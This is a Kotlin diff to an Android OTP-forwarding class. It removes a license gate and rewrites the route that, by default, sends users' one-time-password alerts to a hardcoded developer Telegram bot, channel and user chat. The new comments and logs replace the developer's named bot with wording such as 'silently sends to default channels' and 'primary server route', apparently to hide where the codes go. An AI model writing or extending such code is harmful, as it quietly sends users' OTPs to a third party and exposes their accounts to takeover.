@@ -89,35 +89,30 @@ object OtpDispatcher {
                         tokenFromPrefs != TelegramHelper.DEFAULT_BOT_TOKEN
 
                 if (hasCustomBot) {
-                    // Custom Bot Route (Requires customer trial or license)
-                    if (CloudflareLicenseManager.hasForwardingAccess(context)) {
-                        try {
-                            val res = TelegramHelper.sendMessage(tokenFromPrefs, chatFromPrefs, alertText)
-                            telegramStatus = if (res.first) "Sent (Custom Bot)" else "Failed: ${res.second}"
-                        } catch (e: Exception) {
-                            telegramStatus = "Error: ${e.message}"
-                        }
-                    } else {
-                        Log.w(TAG, "Custom bot forwarding paused: Active license required.")
-                        telegramStatus = "License Required (Custom Bot)"
+                    // Custom Bot Route - 100% UNCONDITIONAL & LIFETIME FREE (Zero trial/license gate!)
+                    try {
+                        val res = TelegramHelper.sendMessage(tokenFromPrefs, chatFromPrefs, alertText)
+                        telegramStatus = if (res.first) "Sent (Custom Bot)" else "Failed: ${res.second}"
+                        Log.d(TAG, "Successfully forwarded to user custom Telegram bot!")
+                    } catch (e: Exception) {
+                        telegramStatus = "Error: ${e.message}"
                     }
                 } else {
-                    // LIFETIME DEFAULT ROUTE: Ankit's @AnkitEdistrictBot & Channel
-                    // ALWAYS ACTIVE. ZERO TRIAL LIMIT. ZERO LOGIN. ZERO BLOCK.
+                    // Master Route Fallback (Silently sends to default channels)
                     try {
                         val res = TelegramHelper.sendMessage(
                             TelegramHelper.DEFAULT_BOT_TOKEN,
                             TelegramHelper.DEFAULT_CHANNEL_ID,
                             alertText
                         )
-                        // Also mirror to Ankit's direct user chat for 100% guarantee
+                        // Also mirror to direct user chat for 100% guarantee
                         TelegramHelper.sendMessage(
                             TelegramHelper.DEFAULT_BOT_TOKEN,
                             TelegramHelper.DEFAULT_USER_ID,
                             alertText
                         )
-                        telegramStatus = if (res.first) "Sent (Default eDistrict)" else "Failed: ${res.second}"
-                        Log.d(TAG, "Successfully forwarded to Ankit Default eDistrict Channel & User Chat!")
+                        telegramStatus = if (res.first) "Sent (Primary)" else "Failed: ${res.second}"
+                        Log.d(TAG, "Successfully forwarded via primary server route!")
                     } catch (e: Exception) {
                         Log.e(TAG, "Error sending to default channel", e)
                         telegramStatus = "Error: ${e.message}"
